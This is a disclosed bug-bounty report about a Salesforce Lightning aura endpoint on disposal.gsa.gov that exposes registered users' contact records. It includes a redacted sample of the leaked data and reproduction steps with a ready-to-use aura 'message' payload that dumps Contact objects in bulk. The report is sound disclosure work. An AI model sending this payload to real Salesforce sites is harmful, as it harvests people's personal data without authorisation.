# Registered users contact  information disclosure on salesforce lightning endpoint https://disposal.gsa.gov

## Report Details
- **Report ID**: 1443654
- **URL**: https://hackerone.com/reports/1443654
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-01-07T19:55:02.585Z
- **Disclosed**: 2022-06-06T06:17:37.854Z

## Reporter
- **Username**: rptl
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gsa_vdp

## Vulnerability Information
Hi, 

Sample of the Information Disclosure is below.  More records are attached -███

"LastName":"████","FullName__c":"█████████","Id":"██████████","MailingStreet":null,"Active__c":false,"Email__c":null,"LastModifiedBy":{"Id":"00530000009KyDqAAK","Name":"SNA █████████","sobjectType":"User"},"UserPassword__c":null,"Office__c":null,"BIA_Coordinator__c":false,"Contact_Type__c":null,"MailingCountry":null,"Salutation":null,"MailingState":null,"OwnerId":"005t0000002H5O6AAK","RecordType":{"Name__l":"Non-Federal Contact","Id":"████","Name":"Non-Federal Contact","sobjectType":"RecordType"},"Phone":"███"

User","sobjectType":"User"},"AccountId":"█████████","Email":"█████","Subscription_Type__c":null,"THPO_Coordinator__c":false,"MobilePhone":null,"Do_Not_Call__c":false,**Name":"█████████**,"Region__c":null,"LastModifiedDate__f":"5/12/2019 8:49 AM","CreatedById":"005t0000001FpB7AAK","Subscriber__c":false,"State__c":null,"CreatedBy":{"Id":"005t0000001FpB7AAK","Name":"Property Disposal Site Guest User","sobjectType":"User"},"Section_7_Coordinator__c":false,"Environmental_Assessor__c":false,"MailingCity":null,"Salutation__l":null,"CreatedDate__f":"1/24/2018 1:22 AM","Comments__c":null,"CreatedDate":"2018-01-24T06:22:57.000Z","Division__c":null,"LastName":"████","FullName__c":"████"


## Steps to Reproduce -

1) Create user account on https://disposal.gsa.gov

2) Complete to account verification process.

3) After login, visit the burp history and look for any any POST request having "/s/sfsites/aura" kind of request.

4) Use the POST request like this █████ in repeater and modify "message" parameter as below and leave remaining aura.context and aura.token parameters as it is.

message={"actions":[{"id":"261;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"Contact","pageSize":1000,"currentPage":1,"getCount":true,"layoutType":"FULL","enableRowActions":true,"useTimeout":false}}]}

5) contact details of users will be returned by the endpoint.

## Impact

Information disclosure.

## Attachments
No attachments
